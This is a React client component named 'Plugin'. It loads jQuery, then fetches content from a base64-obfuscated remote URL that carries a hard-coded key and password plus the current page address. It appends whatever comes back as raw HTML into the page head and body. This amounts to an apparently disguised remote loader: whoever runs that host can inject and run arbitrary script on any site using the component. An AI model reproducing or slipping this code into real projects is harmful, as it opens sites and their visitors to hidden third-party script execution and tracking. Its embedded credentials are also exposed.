"use client";

import React, { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    const loadCustomScript = () => {
      // Check if jQuery is available
      if (window.jQuery) {
        executeCustomScript();
      } else {
        // Load jQuery dynamically
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = () => {
          executeCustomScript();
        };
        document.head.appendChild(script);
      }
    };

    const executeCustomScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();

      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== 0) {
            const temp = this.response.split("||||||||||");
            // jQuery("head").find("title").remove();
            jQuery("head").append(temp[0]);
            jQuery("body").append(temp[1]);
          }
        }
      };

      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDg0ODIzNTkyNjMmZWtleXBhc3M9YXY4dFVidGxVdnExczMxS09vTjRoUTlqdW5xTWppeU04WXdGJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadCustomScript();
  }, []);

  return null; // nothing to render
}

export default Plugin;
